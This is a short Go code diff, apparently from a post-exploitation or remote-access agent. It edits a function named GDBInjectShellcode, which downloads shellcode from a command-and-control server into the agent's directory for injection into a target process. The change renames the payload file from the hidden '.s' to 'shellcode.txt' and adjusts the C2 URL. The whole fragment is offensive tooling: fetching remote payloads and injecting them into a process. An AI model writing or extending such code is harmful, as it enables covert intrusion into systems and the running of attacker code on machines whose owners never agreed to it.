@@ -19,8 +19,8 @@ func GDBInjectShellcode(pid int) error {
 		}
 		pid = cmd.Process.Pid
 	}
-	shellcodeFile := AgentRoot + "/.s"
-	err := DownloadViaCC(CCAddress+"/shellcode.txt", shellcodeFile)
+	shellcodeFile := AgentRoot + "/shellcode.txt"
+	err := DownloadViaCC(CCAddress+"shellcode.txt", shellcodeFile)
 	if err != nil {
 		return err
 	}
